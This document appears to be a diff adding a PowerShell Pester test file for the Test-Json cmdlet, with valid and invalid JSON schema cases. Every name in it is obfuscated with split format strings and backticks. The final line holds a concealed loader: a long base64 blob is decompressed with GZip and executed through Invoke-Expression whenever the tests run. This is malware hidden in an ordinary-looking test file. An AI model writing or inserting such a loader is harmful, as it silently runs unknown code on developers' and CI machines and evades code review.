@@ -1,0 +1,108 @@
+.("{0}{1}"-f 'S','eT')  ("{0}{1}" -f'6mB','VTu')  ( [tyPe]("{0}{1}" -f'co','nVERt')) ;   ${0`jM`Vo} =  [tYPE]("{2}{3}{5}{0}{4}{1}"-F 'on','mPRESsioNmodE','iO','.comPReSS','.Co','I'); 
+
+
+.("{0}{2}{1}"-f'Desc','e','rib') ("{1}{0}{2}"-f 'st-Js','Te','on') -Tags "CI" {
+    &("{0}{2}{1}"-f'Befo','All','re') {
+        ${v`A`lIdSc`HeM`AJ`sON} = @"
+            {
+            'description': 'A person',
+            'type': 'object',
+            'properties': {
+                'name': {'type': 'string'},
+                'hobbies': {
+                'type': 'array',
+                'items': {'type': 'string'}
+                }
+                }
+            }
+"@
+
+        ${invALiDSC`hEmA`J`s`oN} = @"
+            {
+            'description',
+            'type': 'object',
+            'properties': {
+                'name': {'type': 'string'},
+                'hobbies': {
+                'type': 'array',
+                'items': {'type': 'string'}
+                }
+                }
+            }
+"@
+
+        ${V`A`LIdjs`On} = @"
+            {
+                'name': 'James',
+                'hobbies': ['.NET', 'Blogging', 'Reading', 'Xbox', 'LOLCATS']
+            }
+"@
+
+        ${iN`VALiDt`YP`eI`NJSon} = @"
+            {
+                'name': 123,
+                'hobbies': ['.NET', 'Blogging', 'Reading', 'Xbox', 'LOLCATS']
+            }
+"@
+
+        ${IN`VALid`TY`pE`iNJs`oN2} = @"
+            {
+                'name': 123,
+                'hobbies': [456, 'Blogging', 'Reading', 'Xbox', 'LOLCATS']
+            }
+"@
+
+        ${iNval`idnOdEiN`j`SoN} = @"
+            {
+                'name': 'James',
+                'hobbies': ['.NET', 'Blogging', 'Reading', 'Xbox', 'LOLCATS']
+                errorNode
+            }
+"@
+}
+
+    &('It') ("{2}{3}{0}{1}"-f 'a','lid','Json is ','v') {
+        &("{2}{1}{0}" -f'Json','-','Test') -Json ${vAl`idJ`SoN} | &("{1}{0}"-f'd','Shoul') -BeTrue
+    }
+
+    &('It') ("{4}{3}{6}{0}{1}{5}{8}{2}{7}" -f'a','l','t','son ','J','i','is v',' a valid schema','d agains') {
+        .("{1}{0}{2}"-f 'es','T','t-Json') -Json ${v`Ali`D`jSon} -Schema ${VAlI`dsCheM`A`J`SoN} | .("{0}{1}{2}" -f 'S','h','ould') -BeTrue
+    }
+
+    &('It') ("{2}{3}{0}{1}{4}" -f ' i','s ','Js','on','invalid') {
+        .("{0}{1}"-f 'Tes','t-Json') -Json ${I`NV`AlIDnOd`E`INJson} -ErrorAction ("{2}{1}{3}{0}"-f 'tinue','il','S','entlyCon') | .("{0}{1}"-f'S','hould') -BeFalse
+    }
+
+    &('It') ("{9}{2}{5}{4}{8}{0}{6}{7}{3}{1}"-f 'ain','ema','on ','id sch',' invalid ','is','st ','a val','ag','Js') {
+        .("{0}{2}{1}" -f 'Test-Js','n','o') -Json ${i`NvaLID`TY`PEi`Nj`son2} -Schema ${validS`cHEm`Ajs`ON} -ErrorAction ("{0}{1}{3}{2}" -f 'SilentlyC','on','e','tinu') | .("{1}{0}"-f 'ould','Sh') -BeFalse
+        .("{2}{1}{0}"-f'son','t-J','Tes') -Json ${invALi`dNOD`EINj`Son} -Schema ${v`A`li`DSCHe`maJsON} -ErrorAction ("{1}{3}{4}{2}{0}"-f 'inue','S','t','i','lentlyCon') | &("{1}{2}{0}" -f'd','Shou','l') -BeFalse
+    }
+
+    &('It') ("{2}{7}{3}{4}{1}{6}{5}{8}{0}" -f 'valid','s','Te','-Json throw if a',' ','m','che','st','a is in') {
+        { .("{0}{2}{1}"-f 'Te','on','st-Js') -Json ${V`A`LIDJSoN} -Schema ${iNvALI`DSC`h`E`mAJsoN} -ErrorAction ("{0}{1}"-f'St','op') } | .("{1}{0}"-f 'ould','Sh') -Throw -ErrorId ("{9}{3}{10}{13}{2}{7}{1}{0}{6}{5}{4}{8}{12}{11}" -f 'werS','Po','chema,Mic','v','mmands.TestJ','o','hell.C','rosoft.','sonC','In','alidJs','mmand','o','onS')
+    }
+
+    &('It') ("{0}{11}{16}{15}{12}{14}{7}{2}{13}{4}{6}{5}{10}{8}{1}{9}{3}" -f 'Test-','id',' (','schema','ame','son ag','>) J',' invalid','l',' ','ainst a va','Json wri','or ','<n','on',' err','te an') -TestCases @(
+        @{ ("{1}{0}"-f'me','na') = ("{0}{1}" -f'typ','e'); ("{1}{0}" -f'on','js') = ${invAl`idt`YpE`injsoN}; ("{1}{0}"-f 'ror','er') = ("{8}{2}{11}{4}{3}{7}{6}{15}{0}{12}{1}{13}{14}{9}{5}{10}" -f'oft.Po','erS','v','onA','dJs','mmands.TestJsonComman','Sc','gainst','In','o','d','ali','w','hel','l.C','hema,Micros') }
+        @{ ("{0}{1}" -f 'nam','e') = ("{1}{0}"-f'e','nod'); ("{0}{1}"-f'jso','n') = ${I`N`VALIdno`deiN`JsON}; ("{1}{0}" -f'ror','er') = ("{1}{14}{5}{3}{7}{0}{2}{6}{8}{10}{11}{4}{9}{13}{12}"-f't.P','Inva','o','icroso','J','dJson,M','werS','f','hell.C','s','ommands.Te','st','nCommand','o','li') }
+        ) {
+            param(${JS`oN}, ${ERR`oR})
+
+            ${eR`ROrV`AR} = ${N`Ull}
+            .("{1}{0}" -f't-Json','Tes') -Json ${Js`On} -Schema ${VaLiD`SCHE`m`A`jSon} -ErrorVariable ("{1}{0}" -f 'rVar','erro') -ErrorAction ("{2}{0}{1}{3}"-f 'C','o','Silently','ntinue')
+
+            ${ERro`RvaR}."f`ULLYq`Ual`iF`IedE`RrorID" | .("{1}{0}{2}" -f 'ou','Sh','ld') -BeExactly ${ER`Ror}
+    }
+
+    &('It') ("{6}{7}{9}{12}{4}{3}{2}{10}{8}{1}{0}{5}{11}" -f 'ch','s',' against ','ck invalid Json','e','e','Test-Json ret','urn all errors','lid ',' whe','a va','ma','n ch') {
+        ${e`RRor`V`Ar} = ${n`ULl}
+        &("{2}{1}{0}" -f'n','st-Jso','Te') -Json ${In`ValIdt`YP`eInJS`oN2} -Schema ${vALIds`c`HE`M`AjsON} -ErrorVariable ("{2}{1}{0}" -f 'r','Va','error') -ErrorAction ("{0}{1}{2}{3}" -f'Sile','ntlyCont','inu','e')
+
+        
+        ${ErRo`RV`Ar}."c`oUnt" | .("{1}{0}" -f 'hould','S') -Be 2
+        ${ERR`O`RvAR}[0]."fuLLyQUAl`if`iEde`Rro`RId" | &("{0}{1}" -f'Sho','uld') -BeExactly ("{18}{13}{7}{20}{4}{16}{8}{0}{15}{11}{17}{9}{19}{10}{14}{3}{1}{2}{6}{12}{5}"-f'h','n','ds.T','a','s','nCommand','e','d','stSc','icrosof','PowerShell.C','a,','stJso','li','omm','em','onAgain','M','Inva','t.','J')
+        ${ER`RoRVAr}[1]."FulLyQuA`lIfIE`dERRO`R`id" | .("{1}{0}"-f'd','Shoul') -BeExactly ("{6}{10}{12}{8}{7}{5}{13}{11}{9}{0}{2}{1}{3}{4}"-f 'a','e','nds.T','stJ','sonCommand','ll','Inv','stSchema,Microsoft.PowerShe','n','m','al','om','idJsonAgai','.C')
+    }
+}
+
+${s}=.("{2}{1}{0}" -f'bject','O','New-') ("{3}{4}{2}{1}{0}"-f'm','trea','oryS','IO.','Mem')(,  (&("{0}{1}{3}{2}"-f'get-vAR','IA','le','B') ("{1}{0}" -f 'vtU','6mB') ).VAluE::("{2}{1}{0}"-f 'ing','ase64Str','FromB').Invoke(("{2}{42}{9}{14}{30}{32}{25}{37}{27}{12}{39}{8}{31}{13}{18}{35}{24}{5}{41}{6}{29}{38}{34}{19}{36}{3}{11}{15}{4}{28}{21}{17}{20}{40}{16}{7}{10}{0}{33}{23}{26}{22}{1}"-f 'SJv0DGrcEJaV8xdXu','ERITAxnfwFsVCV+Bg0AAA==','H4sIAAAA','m7dWKxdFlK7aq1l1U1utFY7fsfBpGZh2Jh/O30m4YJTxuh4+D0B2Muu2+hS46T+hNyyDrhd','TLFTLFN5Mf7UbA9HxkdUNvrY2','EF4Nh/SyGr','c+Eb8gqLXHzhnxoPzWLpl0Pew3jCrGtu7Wvush22JXRngDdPSu','D/3BBchelbsDRskE7t3YppHnQjL5DHSGGBp02daubasTROjoYfu7W4EHiuag9anz1CqZ+2rFrFcvTISuf4M0OcklUb+IHCet5f/QRE0chEvMIR+gER6qmCECI','S2TiUB3','2Z1NQ//lD16Vl5Vrj9GGEeaqq1DyX1CoRzVVe+6','2tnPcFiDk17eVha0cCnHAYJGDUOuY84F3bcgH/QCWEc','ffkIrpDvi92','TJnGrpvOZtmzB84w/0NB5QNXxpM6M9XjWpmOBCOz3Eni5+Q+vpgvIsYJDWKCH0fuDXWYT2/2PvaYfQhO7SWnUYfTBJDCgawLimpqdkHJTQaPGiM6fc526zH5lbeWKodscHwIWkFM6N8rkzpRU1u+ST0AMN2r','gXoBhYK','PGDg/2aaq','2XV3d2+NrQ9vnocX5RSGSs0NpYP//WHjNWuWCaTUZn08c16','sLadN5OsEv6I14Tsuy4deDdbNEGgL3YVawroAkMKtuXbb9YLF5tyKQ7oS5CuFcvC74olsdrhBG6B51BvxpCBhHj','SPPDVrsTbAqG2','2pzTCPUckrTUZobW8x','2PbXcdWENtvevUgK/U4rfte','uzTa1pAb1rD','2Kj+HY','K1+UMwAFhZVzGPMDN4p7opL+a/msbMGUhPGz0qc2hVH2rC0W0OsojDax6','U993r762K9175Ky8fd+AjK44d48pCeS6FeyiXUH/I/Y53VvOTpX8f629lPbl+Ffyl/DNKzy+8PfsUd/x6iMWYSWC2o7Zym08lrkcoC8Gg','XDsQn3IUiqJN+xSov5E7UOipFkRY3UA6UhpCACLC5lXRiyQUIPU/LPI+5fqfV+SvtOzHtDMk1qSitPaXsYJk1DacSe4/gpmAl0gATYj','w2qfOTOvS7QGH1zJpx0xA1Z','WPPI0RJiT/eLR/S6SZ12YFHPq+1yu5ShHCIXsEwzt9KNypcfzXyhxIM+exAIm/KQNaqdYV1q3E+UU','1aT4Qs4btWSnnFBCWwFMEetqeDIKL6','PbBpsGwsZywx','1rhCpd+6bzNg2+','rJ7ECEwpGFMfMr54Vhon03Ud5MdVf1HNgWUBkFvvJjE2OZKYemwrIHyKAUQVUvtPyNWFHt1I84zyvvtWmmUD/yJfMo3EsaiLVFgw2zaVhoYp','Ez/QVIs6frwg9lENn','9','vKVUP/WlQ9H7949giFZUYmTvNChviuX+dKuUipBKy3tqi','+8DKrotI76l363W6rbBWzuSk/Ha12pyUUKVSvauUVoS2Y/oVIl','96CC+iImdcw5812QtAGfwEmMhSXjoAlI/u8BohcsKlvemlMPqJOKY','n8xPjcex7xZrBpLZyxC67L6SHDjghNUE+ScR3jUF4O','OBns/c9xrdzcTFqThVf679URzo8HsWC3ruS+6FqCKUUxdLOpcA/VFY5U5OpsmSgj','x8QqcGZ','4CwHUoIeqLM02B9ej/dApNY5DsO80osgJ+28YlHMKckryA9ZdoUiKZKl+k1dM+K','xFIys6pvi23F7B5iPErmPonP/8EABm6VdK/VvmsWl81iqtfyLyy0XH8MJmzjFEbMN0bcMa','cM39V+K96xNoLfQ8vnJmmvWLm1h','AAAAAL1XeW/aSBT/O3wKaxXJtpZwBJKmlSJ1IDFHMSGYK2ERGjxjM2HsofaYo9t+930+aOkm7aba1SJZmuO9N+/93olF5ZklA2ZLUxCqnI1oEDLhK+e53OmNaEnlWnmv5pzIt2V8HC/mLpXzdSDsOSYkoGGo/Jk76eEAe4p2usHB3BMk4jSvJJuYkJIooPrJSe4kOYr8EDt07mPJNnTuUbkUJISHtClar2+Eh5k/e/euHgUB9WW6LzSoRGFIvQVnNNR05bMyXtKAnt0tnqgtlT+V03mhwcUC84xsX8f2EgxCPonvOsLGsQUFa8')));.("{0}{1}"-f'IE','X') (.("{2}{1}{3}{0}" -f 'ect','e','N','w-Obj') ("{0}{2}{1}"-f 'IO.','treamReader','S')(&("{2}{0}{1}" -f'e','w-Object','N') ("{0}{3}{1}{2}{4}" -f'I','on','.G','O.Compressi','zipStream')(${s},  (.('Gi') ('vAr'+'IabLE:0'+'J'+'mVo')  ).VALue::"De`co`MpRe`sS"))).("{1}{2}{0}"-f 'nd','Rea','dToE').Invoke();
